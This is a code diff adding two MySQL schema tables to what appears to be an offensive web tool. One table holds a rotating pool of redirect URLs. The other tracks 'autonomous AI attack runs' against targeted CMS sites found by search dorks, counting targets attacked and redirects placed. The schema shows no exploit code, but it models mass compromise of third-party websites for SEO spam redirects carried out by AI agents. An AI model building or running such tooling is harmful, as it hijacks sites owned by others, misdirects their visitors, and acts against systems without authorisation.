@@ -1410,3 +1410,54 @@ export const wafDetections = mysqlTable("waf_detections", {
 
 export type WafDetectionRecord = typeof wafDetections.$inferSelect;
 export type InsertWafDetection = typeof wafDetections.$inferInsert;
+
+
+// ═══════════════════════════════════════════════════════
+// Redirect URL Pool — Multiple redirect destinations with rotation
+// ═══════════════════════════════════════════════════════
+export const redirectUrlPool = mysqlTable("redirect_url_pool", {
+  id: int("id").primaryKey().autoincrement(),
+  url: varchar("url", { length: 512 }).notNull(),
+  label: varchar("label", { length: 128 }),
+  weight: int("weight").default(1).notNull(),
+  isActive: boolean("isActive").default(true).notNull(),
+  isDefault: boolean("isDefault").default(false).notNull(),
+  successCount: int("successCount").default(0).notNull(),
+  failCount: int("failCount").default(0).notNull(),
+  lastUsedAt: timestamp("lastUsedAt"),
+  createdAt: timestamp("createdAt").defaultNow().notNull(),
+  updatedAt: timestamp("updatedAt").defaultNow().notNull(),
+});
+export type RedirectUrl = typeof redirectUrlPool.$inferSelect;
+export type InsertRedirectUrl = typeof redirectUrlPool.$inferInsert;
+
+// ═══════════════════════════════════════════════════════
+// Agentic Attack Sessions — Autonomous AI attack runs
+// ═══════════════════════════════════════════════════════
+export const agenticSessions = mysqlTable("agentic_sessions", {
+  id: int("id").primaryKey().autoincrement(),
+  userId: int("userId").notNull(),
+  status: varchar("status", { length: 32 }).default("running").notNull(),
+  mode: varchar("mode", { length: 32 }).default("full_auto").notNull(),
+  redirectUrls: json("redirectUrls"),
+  targetCms: json("targetCms"),
+  maxTargetsPerRun: int("maxTargetsPerRun").default(50).notNull(),
+  maxConcurrent: int("maxConcurrent").default(3).notNull(),
+  seoKeywords: json("seoKeywords"),
+  customDorks: json("customDorks"),
+  targetsDiscovered: int("targetsDiscovered").default(0).notNull(),
+  targetsAttacked: int("targetsAttacked").default(0).notNull(),
+  targetsSucceeded: int("targetsSucceeded").default(0).notNull(),
+  targetsFailed: int("targetsFailed").default(0).notNull(),
+  totalRedirectsPlaced: int("totalRedirectsPlaced").default(0).notNull(),
+  startedAt: timestamp("startedAt").defaultNow().notNull(),
+  lastActivityAt: timestamp("lastActivityAt"),
+  completedAt: timestamp("completedAt"),
+  currentPhase: varchar("currentPhase", { length: 128 }).default("initializing"),
+  currentTarget: varchar("currentTarget", { length: 512 }),
+  eventsLog: json("eventsLog"),
+  errors: json("errors"),
+  createdAt: timestamp("createdAt").defaultNow().notNull(),
+});
+export type AgenticSession = typeof agenticSessions.$inferSelect;
+export type InsertAgenticSession = typeof agenticSessions.$inferInsert;
